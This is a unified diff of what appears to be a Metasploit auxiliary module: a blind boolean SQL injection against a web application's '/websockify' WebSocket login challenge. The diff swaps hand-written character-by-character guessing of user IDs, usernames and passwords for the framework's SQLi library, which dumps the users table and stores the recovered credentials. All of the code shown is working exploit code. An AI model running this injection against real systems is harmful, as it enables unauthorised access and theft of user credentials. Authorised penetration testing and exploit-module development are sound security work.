@@ -9,6 +9,7 @@ class MetasploitModule < Msf::Auxiliary
   include Rex::Proto::Http::WebSocket
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Exploit::SQLi
 
   def initialize(info = {})
     super(
@@ -49,9 +50,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options([
-      OptString.new('TARGETURI', [true, 'Base path', '/']),
-      OptInt.new('STRING_FIELD_LENGTH', [true, 'The maximum length of the guessed username and/or password.', 16]),
-      OptInt.new('ID_SCAN', [true, 'Total number of user IDs to try enumerate for valid users. 0 through (this number - 1)', 30])
+      OptString.new('TARGETURI', [true, 'Base path', '/'])
     ])
   end
 
@@ -59,8 +58,9 @@ class MetasploitModule < Msf::Auxiliary
   def create_injection_request(query)
     id = Rex::Text.rand_text_alphanumeric(12)
     req = "{\"type\":\"request\",\"message\":{\"transactionid\":\"#{id}\",\"version\":\"1.0\",\"action\":\"challenge\",\"username\":\""
+    req.concat("\' OR ")
     req.concat(query)
-    req.concat('"}}')
+    req.concat('--"}}')
     req
   end
 
@@ -80,77 +80,6 @@ class MetasploitModule < Msf::Auxiliary
     return 1 if status.nil?
 
     status
-  end
-
-  # Guess valid user ids in the database. These are sequential (0, 1, 2, etc) with the default
-  # admin user starting at 0. Return an array of valid ids.
-  def guess_user_ids
-    return_array = []
-
-    datastore['ID_SCAN'].times do |n|
-      wsock = connect_ws(
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, '/websockify')
-      )
-
-      wsock.put_wstext(create_injection_request("' OR user_id=#{n}--"))
-      next unless recv_wsframe_status(wsock) == 0
-
-      return_array << n
-    end
-
-    return_array
-  end
-
-  # A generic injection to guess a fields length.
-  def guess_field_length(id, field)
-    datastore['STRING_FIELD_LENGTH'].times do |n|
-      wsock = connect_ws(
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, '/websockify')
-      )
-
-      wsock.put_wstext(create_injection_request("\' OR user_id=#{id} AND LENGTH(#{field})=#{n}--"))
-      next unless recv_wsframe_status(wsock) == 0
-
-      return n
-    end
-
-    return 0
-  end
-
-  # A generic injection to guess a string field. This implementation guesses all printable
-  # characters (which is inline with allowed password values). It excludes \ since, while
-  # the user can technically use it in a password, you can't actually log in if the character
-  # is present. Returns the guessed value
-  def guess_string(id, field, length)
-    string = ''
-    length.times do |n|
-      (0x20...0x7e).each do |printable|
-        next if printable == '\\'.ord
-
-        char = printable.chr
-
-        wsock = connect_ws(
-          'method' => 'GET',
-          'uri' => normalize_uri(target_uri.path, '/websockify')
-        )
-        temp_string = string + char
-
-        wsock.put_wstext(create_injection_request("\' OR user_id=#{id} AND substr(#{field},1,#{temp_string.length})='#{temp_string}'--"))
-        next unless recv_wsframe_status(wsock) == 0
-
-        string.concat(char)
-        return string if string.length == length
-
-        break
-      end
-
-      # if string.length != n+1 then we failed to guess a character
-      return '' unless string.length == (n + 1)
-    end
-
-    ''
   end
 
   # Extract the version from the cgi endpoint and return true if the
@@ -184,29 +113,20 @@ class MetasploitModule < Msf::Auxiliary
       print_error('The reported version is not vulnerable.')
     end
 
-    # attack happens in three parts:
-    # - guess user ids
-    # - for each id:
-    #   - guess username
-    #   - guess password
-    discovered_ids = guess_user_ids
-    print_status("Found #{discovered_ids.length} valid user ids")
+    sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
+      wsock = connect_ws(
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, '/websockify')
+      )
 
-    discovered_ids.each do |id|
-      username_length = guess_field_length(id, 'user_name')
-      next unless username_length != 0
+      wsock.put_wstext(create_injection_request(payload))
+      recv_wsframe_status(wsock) == 0
+    end
 
-      username = guess_string(id, 'user_name', username_length)
-      next if username.empty?
-
-      password_length = guess_field_length(id, 'user_password')
-      next unless password_length != 0
-
-      password = guess_string(id, 'user_password', password_length)
-      next if password.empty?
-
-      print_status("Found the following username and password: #{username} - #{password}")
-      store_valid_credential(user: username, private: password)
+    users = sqli.dump_table_fields('users', ['user_name', 'user_password'])
+    users.each do |user|
+      print_status("Found the following username and password: #{user[0]} - #{user[1]}")
+      store_valid_credential(user: user[0], private: user[1])
     end
   end
 end
